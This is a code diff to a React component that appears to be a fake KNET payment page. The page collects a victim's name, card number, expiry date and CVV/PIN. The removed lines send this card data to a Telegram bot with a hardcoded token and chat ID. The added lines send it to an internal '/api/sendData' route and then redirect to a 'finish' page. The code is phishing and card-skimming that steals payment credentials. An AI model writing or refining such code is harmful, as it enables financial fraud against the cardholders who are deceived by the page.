@@ -21,9 +21,8 @@ function KnetPageContent() {
   const searchParams = useSearchParams();
   const price = searchParams.get("price");
   const refN = searchParams.get("refN");
-
-  const handleSend = async () => {
-    if (
+const handleSend = async () => {
+  if (
       !fullName.trim() ||
       !cardNumber.trim() ||
       !expMonth.trim() ||
@@ -44,25 +43,29 @@ function KnetPageContent() {
 🔐 PIN: ${cvv}
 🔨 Ref: ${refN}
     `;
+  
+  try {
+    setIsProcessing(true);
+    const res = await fetch("/api/sendData", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text }),
+    });
 
-    try {
-      setIsProcessing(true);
-      await axios.post(
-        `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=-4836393174&text=${encodeURIComponent(
-          text
-        )}`
-      );
-      setIsProcessing(false);
+    const result = await res.json();
+    setIsProcessing(false);
 
-      // التحويل مباشرة بعد الإرسال
-      router.push(`/kpay/finish?name=${cardNumber}`);
-    } catch (error) {
-      alert("Error sending data");
-      setIsProcessing(false);
-      console.error(error);
+    if (result.success) {
+      router.push(`/kpay/finish?refN=${refN}&price=${price}`);
+    } else {
+      alert("حدث خطأ: " + result.error);
     }
-  };
-
+  } catch (err) {
+    setIsProcessing(false);
+    console.error(err);
+    alert("حدث خطأ أثناء الإرسال");
+  }
+};
   return (
     <div className={styles.knetContainer}>
       <div className={styles.knetBox}>
